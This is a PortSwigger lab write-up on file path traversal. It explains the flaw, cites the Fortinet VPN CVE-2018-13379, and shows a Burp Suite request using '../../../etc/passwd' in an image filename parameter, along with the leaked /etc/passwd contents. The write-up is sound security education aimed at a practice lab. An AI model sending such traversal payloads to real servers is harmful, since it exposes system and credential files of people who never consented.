📁 PortSwigger Lab Write-up: File Path Traversal
🔍 What is Path Traversal?

Path traversal (also known as directory traversal) is a vulnerability that allows an attacker to read arbitrary files on the server that is running an application.

This happens when user input is not properly validated and is used to construct file paths.

⚠️ Impact of Path Traversal

If exploited, an attacker may be able to access:

Application source code and data
Credentials for backend systems
Sensitive operating system files

In some cases, attackers may also be able to write to arbitrary files, which can lead to:

Application manipulation
Data corruption
Full server compromise
🌍 Real-World Example: Fortinet SSL VPN (CVE-2018-13379)

CVE-2018-13379 is a critical path traversal vulnerability found in Fortinet’s FortiOS SSL VPN web portal.

The flaw allowed unauthenticated attackers to access sensitive system files by manipulating URL paths.

Because the VPN portal did not properly sanitize user input, attackers could request files outside the intended directory, exposing:

Configuration files
Session data
Potential user credentials and authentication information

Although a patch was released in 2019, the vulnerability remained widely exploited due to delayed patching across organizations. Attackers used it to:

Steal VPN credentials
Gain unauthorized internal network access
Deploy ransomware in some cases

This became a strong real-world example of how exposed VPN services are high-value targets when patching is neglected.

🧪 Lab: File Path Traversal (PortSwigger)
🎯 Objective

Retrieve the contents of the /etc/passwd file.

🛠️ Initial Observation

While exploring the application, I discovered the following endpoint:

/image?filename=7.jpg

This endpoint loads images from the server based on a filename parameter.

Example request:

GET /image?filename=7.jpg
💡 Vulnerability Testing

I intercepted the request using Burp Suite and sent it to Repeater.

I then modified the filename parameter to attempt a path traversal attack:

GET /image?filename=../../../etc/passwd HTTP/2
💥 Exploitation Result

The server responded with:

HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

Instead of an image, the response contained the contents of /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash

This confirmed that the application was vulnerable to directory traversal, allowing arbitrary file access.

🧠 Key Takeaways
Path traversal occurs when file paths are built using unsanitized user input
../ sequences can be used to move up directory levels
Sensitive files like /etc/passwd can be exposed if no protections are in place
Similar flaws have heavily impacted real-world systems (like VPN portals)
Proper input validation and secure file handling are critical defenses
